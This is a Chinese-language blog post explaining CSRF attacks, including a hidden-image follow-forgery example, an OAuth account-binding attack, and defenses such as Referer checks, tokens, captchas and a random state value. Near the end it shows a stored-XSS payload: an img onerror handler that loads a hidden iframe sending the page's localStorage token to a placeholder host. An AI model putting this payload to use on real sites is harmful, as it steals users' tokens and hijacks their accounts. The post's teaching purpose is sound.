<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>简单易懂的了解 CSRF | Wayshon 小站</title>
    <meta name="description" content="Wayshon Front-End Developer">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    
    <link rel="preload" href="/assets/css/0.styles.f9ac1508.css" as="style"><link rel="preload" href="/assets/js/app.8c522d2d.js" as="script"><link rel="preload" href="/assets/js/35.33689142.js" as="script"><link rel="prefetch" href="/assets/js/10.a48c16b4.js"><link rel="prefetch" href="/assets/js/11.a5419096.js"><link rel="prefetch" href="/assets/js/12.0cbbfb64.js"><link rel="prefetch" href="/assets/js/13.b16df315.js"><link rel="prefetch" href="/assets/js/14.8b3ec47e.js"><link rel="prefetch" href="/assets/js/15.cabe99a1.js"><link rel="prefetch" href="/assets/js/16.a67cc252.js"><link rel="prefetch" href="/assets/js/17.ebb89b66.js"><link rel="prefetch" href="/assets/js/18.a53fbdf8.js"><link rel="prefetch" href="/assets/js/19.e80ac3d4.js"><link rel="prefetch" href="/assets/js/2.dbba3d8d.js"><link rel="prefetch" href="/assets/js/20.53051d6e.js"><link rel="prefetch" href="/assets/js/21.d29f15e7.js"><link rel="prefetch" href="/assets/js/22.0319bfb1.js"><link rel="prefetch" href="/assets/js/23.733b9128.js"><link rel="prefetch" href="/assets/js/24.6f9108aa.js"><link rel="prefetch" href="/assets/js/25.1213099a.js"><link rel="prefetch" href="/assets/js/26.274b0122.js"><link rel="prefetch" href="/assets/js/27.2639d4bf.js"><link rel="prefetch" href="/assets/js/28.b288a6e5.js"><link rel="prefetch" href="/assets/js/29.2fd2e932.js"><link rel="prefetch" href="/assets/js/3.091fb819.js"><link rel="prefetch" href="/assets/js/30.119e4149.js"><link rel="prefetch" href="/assets/js/31.432e6cb3.js"><link rel="prefetch" href="/assets/js/32.011184fe.js"><link rel="prefetch" href="/assets/js/33.00b83608.js"><link rel="prefetch" href="/assets/js/34.d802c816.js"><link rel="prefetch" href="/assets/js/36.e5d943d9.js"><link rel="prefetch" href="/assets/js/37.4d6aca58.js"><link rel="prefetch" href="/assets/js/38.5495d034.js"><link rel="prefetch" href="/assets/js/39.84dc2dc6.js"><link rel="prefetch" href="/assets/js/4.f95145a6.js"><link rel="prefetch" href="/assets/js/5.12543c1d.js"><link rel="prefetch" href="/assets/js/6.b216a31d.js"><link rel="prefetch" href="/assets/js/7.093a7fe1.js"><link rel="prefetch" href="/assets/js/8.e7981210.js"><link rel="prefetch" href="/assets/js/9.333127fc.js">
    <link rel="stylesheet" href="/assets/css/0.styles.f9ac1508.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Wayshon 小站</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/archives.html" class="nav-link">归档</a></div><div class="nav-item"><a href="/about.html" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://www.github.com/wayshon" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">side project</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://itunes.apple.com/cn/app/id1447258000" target="_blank" rel="noopener noreferrer" class="nav-link external">
  关心宝
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://imgqr.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  qr code
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://base64.imgqr.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  base64
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://calcbit.com/garbage-web/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  垃圾分类
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">主页</a></div><div class="nav-item"><a href="/archives.html" class="nav-link">归档</a></div><div class="nav-item"><a href="/about.html" class="nav-link">关于我</a></div><div class="nav-item"><a href="https://www.github.com/wayshon" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">side project</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://itunes.apple.com/cn/app/id1447258000" target="_blank" rel="noopener noreferrer" class="nav-link external">
  关心宝
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://imgqr.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  qr code
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://base64.imgqr.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  base64
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://calcbit.com/garbage-web/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  垃圾分类
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav>  <!----> </div> <div class="page"> <div class="content"><h2 id="简单易懂的了解-csrf"><a href="#简单易懂的了解-csrf" aria-hidden="true" class="header-anchor">#</a> 简单易懂的了解 CSRF</h2> <h3 id="csrf-攻击是什么"><a href="#csrf-攻击是什么" aria-hidden="true" class="header-anchor">#</a> CSRF 攻击是什么</h3> <p><code>CSRF</code>也被称为<code>XSRF</code>，是跨站请求伪造的缩写，是利用用户缓存的登录态，请求自动带上 cookie 骗取服务端信任，执行非本意的操作的攻击方法。
因为服务器只认请求携带过来的 cookie 信息，只能保证请求来自缓存有用户信息的浏览器，而不知道是不是用户自愿发生的请求。
与<code>XSS</code>相比，<code>XSS</code>利用了用户对网站的信任，，<code>CSRF</code>利用的是网站对用户网页浏览器的信任。份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p> <h3 id="先举个栗子🌰"><a href="#先举个栗子🌰" aria-hidden="true" class="header-anchor">#</a> 先举个栗子🌰</h3> <p>假设某博有一个关注接口，可以让登录用户关注某个账号；设想一个情景是该接口有 CSRF 漏洞可以被黑客利用刷关注数。黑客应该如何利用该漏洞？</p> <ul><li>写个xx网站，搞个隐藏 img 标签，src 为上述关注接口</li> <li>用户浏览这个网页的时候，会请求上述接口，如果用户登录过头条，这时候登录态就带过去了，关注成功</li> <li>进阶：使用 form 代替 img，在 window.onload submit form，可以改GET为POST攻击</li></ul> <h3 id="怎么防御"><a href="#怎么防御" aria-hidden="true" class="header-anchor">#</a> 怎么防御</h3> <p>首先得知道它怎么进行攻击，以及攻击的目标</p> <ul><li>用户必须已经在目标网站登录，然后携带用户的cookie欺骗服务器</li> <li>黑客并不能拿到 cookie，且看不到 cookie 的内容。由于浏览器同源策略的限制，也无法解析服务返回的内容。所以我们要保护的对象是写服务，而对于读服务则不需要进行CSRF的保护</li> <li>保护的关键，是 在请求中放入黑客所不能伪造的信息</li></ul> <h4 id="低端操作"><a href="#低端操作" aria-hidden="true" class="header-anchor">#</a> 低端操作</h4> <p>敏感操作用POST代替GET，这个在上面已经说了，没多大用处</p> <h4 id="常规操作"><a href="#常规操作" aria-hidden="true" class="header-anchor">#</a> 常规操作</h4> <h5 id="限制请求来源-referer"><a href="#限制请求来源-referer" aria-hidden="true" class="header-anchor">#</a> 限制请求来源 Referer</h5> <p>方法：HTTP Header 里有一个 referer 字段表示请求的来源，服务器可验证这个 referer 并拒绝访问
优点：简单易实现
缺点：严重依赖浏览器实现，上古浏览器referer可被修改，新策略可以允许不带 referer</p> <h5 id="添加-token-验证"><a href="#添加-token-验证" aria-hidden="true" class="header-anchor">#</a> 添加 token 验证</h5> <p>方法：</p> <ol><li>用户在登录的时候服务器产生 token 返回给前端</li> <li>前端发请求的时候，将 token 放到请求url里或者请求头中带给服务器。</li> <li>服务器验证 token，由于黑客无法登录得到或者伪造 token，所以能防范 CSRF
缺点：
并不绝对安全：</li> <li>配合其他攻击方式如XSS和JSONP获取到token，再将token待到url参数；
a. 将 token 放到 请求 header 里可避免这个问题，毕竟 img script form 等标签发出的请求无法自定义请求 header</li> <li>存在更极端的情况
a. abc.com 下有两个服务，通过 nginx 之类分流到 abc.com/a 和 abc.com/b
b. 当 a 存在隐患被攻击成功后，a 可以修改 abc.com 的 token 信息，且 a 请求到 abc.com 下其他的服务都不存在跨域问题，从而导致一个服务沦陷，同域下其他服务也造成危险</li></ol> <h4 id="简单粗暴的操作"><a href="#简单粗暴的操作" aria-hidden="true" class="header-anchor">#</a> 简单粗暴的操作</h4> <p>方法：添加验证码来验证这个操作是不是用户主动发起的
优点：简单粗暴，相当可靠
缺点：对用户不友好</p> <h3 id="oauth-csrf-攻击"><a href="#oauth-csrf-攻击" aria-hidden="true" class="header-anchor">#</a> OAuth CSRF 攻击</h3> <h4 id="举个栗子🌰："><a href="#举个栗子🌰：" aria-hidden="true" class="header-anchor">#</a> 举个栗子🌰：</h4> <p>用户平台（比如某交友平台）；认证服务器（比如github）</p> <ol><li><p>正常流程</p></li> <li><p>老李登录某交友平台，没关联 github，交友平台 跳转到 github</p></li> <li><p>老李在 github 登录，github 获取用户授权</p></li> <li><p>github 生成老李在 github 平台唯一对应的 code 回调 交友平台 的地址</p></li> <li><p>交友平台 将 code 与老李在自己平台的账号关联
问题在于 github 授权完成跳回 交友平台 的带有 code 的重定向 URI 对于 交友平台 服务器来说是无状态的，该 code 标识的只是老李在 github 平台的唯一性</p></li> <li><p>张三的攻击流程</p></li> <li><p>张三在 1.c 步奏带上 code 的时候没有真正执行 1.d，比如断网或者恶意存储起来</p></li> <li><p>这时候老李在 交友平台 已登录但是未绑定 github，张三将自己的 code 发给老李，导致老李的号绑定了张三的 github 账号，张三就可以用自己的 github 账号登录老李的 交友平台</p></li> <li><p>那么，张三怎么将 code 发给老李的呢，这时候假设老李访问了张三写的某某相亲平台，里面有一个 img 标签，src 为 交友平台的回调地址并带上张三准备好的 code，因为老李在 交友平台 已经登录且未绑定 github，这时候就相当于把张三的 github 绑定到了老李在 交友平台 的号。完成了一次 CSRF 攻击</p></li></ol> <h5 id="防御办法-随机数校验"><a href="#防御办法-随机数校验" aria-hidden="true" class="header-anchor">#</a> 防御办法: 随机数校验</h5> <p>上述攻击的关键就在于 交友平台 无法判断由 github 重定向回的URI是否是当前登录用户老李所发起的授权。可以通过随机数 R 来判断 code 是否合法</p> <ol><li>交友平台 在跳转 github 的时候往用户 session 写一个随机数 R，并传给 github</li> <li>github 回调 交友平台 的时候将 code 和 R 一起带给 交友平台</li> <li>交友平台 将 github 传过来的 R 和 老李 session 里的 R 校验，通过就证明 code 有效</li></ol> <p><b>由上可知对利用OAuth进行CSRF攻击的条件是很苛刻的：</b>攻击者必须了解目标网站的<b>绑定特性</b>，比如一个账号只能绑定一个 OAuth，攻击者只能定向攻击没有绑定 OAuth 的号，并且攻击一次后需要解绑才能攻击下一个。无法快速大范围撒网攻击</p> <h3 id="xss-csrf-配合"><a href="#xss-csrf-配合" aria-hidden="true" class="header-anchor">#</a> XSS+CSRF 配合</h3> <blockquote><p>存储型 XSS + CSRF</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>&lt;img
	width=&quot;0&quot;
	height=&quot;0&quot;
	src=&quot;xx&quot;
	onerror=&quot;javascript:var i=document.createElement('iframe');i.width=0;i.height=0;i.frameBorder=null;i.src=`http://xx/csrf.html?token=${localStorage.getItem('token')}`;document.body.appendChild(i)&quot;
/&gt;
</code></pre></div><ol><li>插一个隐藏的 img 标签，src 乱设置一个请求不通的，必然执行 onerror</li> <li>onerror 里创建一个隐藏的 iframe，指向 scrf 页面，并带上当前获取到的 token 或 cookie</li></ol> <h3 id="总结"><a href="#总结" aria-hidden="true" class="header-anchor">#</a> 总结</h3> <p><strong>CSRF攻击利用的是服务器无法分辨请求是不是用户本人发起的，所以防范的关键在于在请求中放入黑客所不能伪造的信息。从而防止黑客伪造一个完整的请求欺骗服务器</strong></p></div> <div class="page-edit"><!----> <!----></div> <!----> </div> <!----></div></div>
    <script src="/assets/js/app.8c522d2d.js" defer></script><script src="/assets/js/35.33689142.js" defer></script>
  </body>
</html>
